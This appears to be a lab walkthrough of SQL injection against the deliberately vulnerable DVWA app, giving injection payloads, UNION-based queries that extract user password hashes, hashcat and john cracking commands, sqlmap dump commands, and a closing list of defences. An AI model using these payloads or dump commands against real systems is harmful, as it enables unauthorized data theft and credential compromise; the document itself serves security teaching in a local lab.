# 🗄️ SQL Injection

## What is SQL Injection?

SQL Injection occurs when user input is inserted directly into a SQL query without sanitization. An attacker can manipulate the query logic to bypass authentication, extract data, or even drop tables.

---

## DVWA Module

The DVWA SQL Injection page accepts a User ID and queries the database:

```php
// Vulnerable code (Low level)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Input `1` runs: `SELECT first_name, last_name FROM users WHERE user_id = '1';`

---

## Step-by-Step Exploitation

### Step 1 — Confirm vulnerability

Input:
```
1' OR '1'='1
```
If it returns all users — the page is vulnerable.

---

### Step 2 — Find number of columns

Use `ORDER BY` to find how many columns the query returns:

```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -   ← error here means 2 columns
```

---

### Step 3 — UNION-based data extraction

```sql
' UNION SELECT null, null-- -
' UNION SELECT 1, 2-- -
```

Now extract useful info:

```sql
-- Database version
' UNION SELECT null, version()-- -

-- Current database name
' UNION SELECT null, database()-- -

-- All databases
' UNION SELECT null, schema_name FROM information_schema.schemata-- -

-- Tables in current database
' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -

-- Columns in users table
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -

-- Extract usernames and passwords
' UNION SELECT user, password FROM users-- -
```

---

### Step 4 — Crack the hashes

DVWA stores passwords as MD5 hashes. Crack with:

```bash
# Using hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Using john
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Online: https://crackstation.net
```

---

### Step 5 — Automated with sqlmap

```bash
# Basic scan
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  --dbs

# Dump users table
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=YOUR_SESSION; security=low" \
  -D dvwa -T users --dump
```

---

## Payloads

See [`payloads.txt`](./payloads.txt)

---

## Security Levels

| Level | Protection |
|-------|-----------|
| Low | No filtering — fully vulnerable |
| Medium | Uses `mysqli_real_escape_string()` — try integer-based injection (no quotes needed) |
| High | Uses PDO with limit — tricky but possible |
| Impossible | Parameterized queries (prepared statements) — not injectable |

---

## How to Defend

- Always use **prepared statements / parameterized queries**
- Use an ORM (e.g., Eloquent, SQLAlchemy)
- Never concatenate user input into SQL strings
- Apply principle of least privilege to the database user
- Validate and whitelist input types (e.g., ID must be an integer)
